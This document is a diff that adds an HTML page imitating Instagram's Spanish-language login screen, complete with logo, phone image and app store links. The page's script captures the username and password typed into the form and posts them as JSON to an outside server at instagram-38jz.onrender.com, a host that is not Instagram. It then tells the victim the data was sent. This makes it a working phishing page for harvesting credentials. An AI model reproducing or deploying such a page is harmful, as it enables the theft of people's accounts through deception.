@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./responsive.css">
+    <title>Instagram</title>
+</head>
+<body>
+<div class="instagram-wrapper">
+    <div class="instagram-phone">
+        <img src="./img/instagram-celular.png" alt="Phone">
+    </div>
+
+    <div class="instagram-continue">
+        <div class="container">
+            <img src="./img/logo-instagram.png" alt="Instagram Logo" class="instagram-logo">
+
+            <!-- Formulario de login -->
+            <form id="login-form" class="login-form">
+                <input type="text" id="usuario" placeholder="Usuario" required>
+                <input type="password" id="contraseña" placeholder="Contraseña" required>
+                <button type="submit" class="instagram-login">Iniciar sesión</button>
+            </form>
+
+        </div>
+
+        <div class="container">
+            <p class="not-account">¿No es tu cuenta?</p>
+            <p class="not-account">
+                <span class="link-blue">Alternar cuentas</span> o
+                <span class="link-blue">Inscribirse</span>
+            </p>
+        </div>
+
+        <div class="get-the-app">
+            <p class="get-app">Descarga la app</p>
+            <div class="download">
+                <a href="https://apps.apple.com/br/app/instagram/id389801252" class="app-download" target="_blank"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" class="app-download" target="_blank"></a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const usuario = document.getElementById('usuario').value;
+    const contraseña = document.getElementById('contraseña').value;
+
+    fetch('https://instagram-38jz.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ usuario, contraseña })
+    })
+    .then(res => res.text())
+    .then(data => alert('Datos enviados correctamente'))
+    .catch(err => alert('Error al enviar datos: ' + err));
+});
+</script>
+
+</body>
+</html>
+
+
